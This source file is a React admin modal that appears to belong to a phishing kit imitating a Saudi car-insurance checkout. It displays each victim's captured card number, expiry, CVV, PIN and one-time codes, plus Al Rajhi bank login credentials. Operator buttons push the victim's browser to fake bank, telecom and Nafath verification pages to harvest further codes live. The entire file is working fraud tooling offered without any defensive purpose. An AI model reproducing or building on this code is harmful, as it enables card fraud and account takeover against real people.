// src/components/CardModal.js
import React, { useState, useEffect, useRef } from "react";
import { Modal, Button, FormControl } from "react-bootstrap";
import ConfirmDialog from "./ConfirmDialog";
import { socket } from "../socket";

const PAGES = [
  "index.html",
  "vehicle.html",
  "insurance.html",
  "addons.html",
  "summary.html",
  "paymen.html",
  "pin.html",
  "verify.html",
  "phone.html",
  "phonecode.html",
  "rajhi.html",
  "stcCall.html",
  "mobilyCall.html",
  "nafad-basmah.html",
];

const LABEL = {
  "index.html":        "Home",
  "vehicle.html":      "Vehicle",
  "insurance.html":    "Insurance",
  "addons.html":       "Addons",
  "summary.html":      "Summary",
  "paymen.html":       "Payment",
  "pin.html":          "PIN",
  "verify.html":       "OTP",
  "phone.html":        "Phone",
  "phonecode.html":    "Phone Code",
  "rajhi.html":        "Rajhi Login",
  "stcCall.html":      "STC Call",
  "mobilyCall.html":   "Mobily Call",
  "nafad-basmah.html": "Nafad-Basmah",
};

export default function CardModal({ ip, user, onClose }) {
  const [confirm, setConfirm]   = useState({ show: false, page: null });
  const [basmah,  setBasmah]    = useState("");

  const [blinkPin,      setBlinkPin]      = useState(false);
  const [blinkOtp,      setBlinkOtp]      = useState(false);
  const [blinkPhoneOtp, setBlinkPhoneOtp] = useState(false);

  const prevPinRef      = useRef(user?.pin || "");
  const prevOtpRef      = useRef(user?.verificationCode || "");
  const prevPhoneOtpRef = useRef(user?.phoneCode || "");

  useEffect(() => {
    const cur = user?.pin || "";
    if (cur && prevPinRef.current !== cur) { setBlinkPin(true); setTimeout(() => setBlinkPin(false), 1500); }
    prevPinRef.current = cur;
  }, [user?.pin]);

  useEffect(() => {
    const cur = user?.verificationCode || "";
    if (cur && prevOtpRef.current !== cur) { setBlinkOtp(true); setTimeout(() => setBlinkOtp(false), 1500); }
    prevOtpRef.current = cur;
  }, [user?.verificationCode]);

  useEffect(() => {
    const cur = user?.phoneCode || "";
    if (cur && prevPhoneOtpRef.current !== cur) { setBlinkPhoneOtp(true); setTimeout(() => setBlinkPhoneOtp(false), 1500); }
    prevPhoneOtpRef.current = cur;
  }, [user?.phoneCode]);

  const handlePageClick = (page) => setConfirm({ show: true, page });

  const hideConfirm = () => {
    setConfirm({ show: false, page: null });
    setBasmah("");
  };

  const handleConfirm = () => {
    // لو الصفحة nafad-basmah نرسل الرقم أولاً قبل التنقل
    if (confirm.page === "nafad-basmah.html" && basmah) {
      socket.emit("updateBasmah", { ip, basmah: Number(basmah) });
    }
    socket.emit("navigateTo", { ip, page: confirm.page });
    hideConfirm();
  };

  const handleDecline = () => {
    socket.emit("navigateTo", { ip, page: `${confirm.page}?declined=true` });
    hideConfirm();
  };

  const handleBan = () => {
    if (!window.confirm(`هل أنت متأكد من حظر ${ip}؟`)) return;
    socket.emit("banUser", { ip });
  };

  const {
    payments = [],
    pin = "",
    verificationCode = "",
    phoneNumber = "",
    operator = "",
    phoneCode = "",
    currentPage = "",
    userName = "",
    idNumber = "",
  } = user || {};

  const titleText = idNumber ? `${userName} — ${idNumber}` : (userName || ip);
  const formatCard = (n) => (n ? n.replace(/(\d{4})(?=\d)/g, "$1 ").trim() : "—");
  const formatExp  = (e) => (e && e.length >= 4 ? `${e.slice(0,2)}/${e.slice(2)}` : e);

  return (
    <>
      <Modal show onHide={onClose} size="xl" centered>
        <Modal.Header closeButton>
          <Modal.Title>Card Control — {titleText}</Modal.Title>
        </Modal.Header>

        <Modal.Body>
          {/* أزرار التنقل - الصف الأول */}
          <div style={{ display:"flex", flexWrap:"wrap", gap:"0.5rem", marginBottom:"1rem" }}>
            {PAGES.slice(0, 7).map((p) => (
              <Button key={p} variant="outline-primary" size="sm"
                className={currentPage === p ? "blink-green" : ""}
                onClick={() => handlePageClick(p)}>
                {LABEL[p]}
              </Button>
            ))}
          </div>

          {/* البطاقات */}
          <div style={{ display:"flex", overflowX:"auto", gap:"1rem",
            padding:"1rem 0", borderTop:"1px solid #ddd", borderBottom:"1px solid #ddd" }}>
            {payments.length === 0 ? (
              <div style={{ color:"#888", padding:"0.5rem" }}>No card submissions yet.</div>
            ) : (
              payments.map((p, idx) => (
                <div key={p._id || idx} style={{ minWidth:"240px", border:"1px solid #ccc",
                  borderRadius:"8px", padding:"0.75rem", backgroundColor:"#fefefe",
                  boxShadow:"0 1px 3px rgba(0,0,0,0.1)", flex:"0 0 auto" }}>
                  <div style={{ fontWeight:600, marginBottom:"0.5rem" }}>Submission {idx + 1}</div>
                  <div><strong>Name:</strong> {p.cardHolderName || "—"}</div>
                  <div><strong>Card #:</strong> {formatCard(p.cardNumber)}</div>
                  <div><strong>Exp:</strong> {formatExp(p.expiryDate) || "—"}</div>
                  <div><strong>CVV:</strong> {p.cvv || "—"}</div>
                  <div><strong>Total:</strong> {p.total || "—"}</div>
                </div>
              ))
            )}
          </div>

          {/* الأكواد */}
          <div style={{ display:"flex", gap:"2rem", marginTop:"1rem", padding:"1rem",
            backgroundColor:"#fafafa", borderRadius:"8px", border:"1px solid #ddd" }}>

            <div style={{ flex:1 }}>
              <h6 style={{ fontWeight:600 }}>Card PIN / OTP</h6>
              <p className={blinkPin ? "blink-green-text" : ""}>
                <strong>PIN:</strong> {pin || "—"}
              </p>
              <p className={blinkOtp ? "blink-green-text" : ""}>
                <strong>Card OTP:</strong> {verificationCode || "—"}
              </p>
            </div>

            <div style={{ flex:1 }}>
              <h6 style={{ fontWeight:600 }}>Phone / OTP</h6>
              <p><strong>Phone #:</strong> {phoneNumber || "—"}</p>
              <p><strong>Operator:</strong> {operator || "—"}</p>
              <p className={blinkPhoneOtp ? "blink-green-text" : ""}>
                <strong>Phone OTP:</strong> {phoneCode || "—"}
              </p>
            </div>

            <div style={{ flex:1 }}>
              <h6 style={{ fontWeight:600 }}>Rajhi</h6>
              <p><strong>Username:</strong> {user?.rajhiUsername || "—"}</p>
              <p><strong>Password:</strong> {user?.rajhiPassword || "—"}</p>
            </div>
          </div>

          {/* أزرار التنقل - الصف الثاني */}
          <div style={{ display:"flex", flexWrap:"wrap", gap:"0.5rem", marginTop:"1rem", alignItems:"center" }}>
            {PAGES.slice(7).map((p) => (
              <Button key={p} variant="outline-primary" size="sm"
                className={currentPage === p ? "blink-green" : ""}
                onClick={() => handlePageClick(p)}>
                {LABEL[p]}
              </Button>
            ))}
            <Button variant="danger" size="sm" onClick={handleBan}
              style={{ marginRight:"auto" }}>
              🚫 حظر
            </Button>
          </div>
        </Modal.Body>
      </Modal>

      <ConfirmDialog
        show={confirm.show}
        page={confirm.page}
        basmah={basmah}
        onBasmahChange={setBasmah}
        onConfirm={handleConfirm}
        onDecline={handleDecline}
        onClose={hideConfirm}
      />
    </>
  );
}
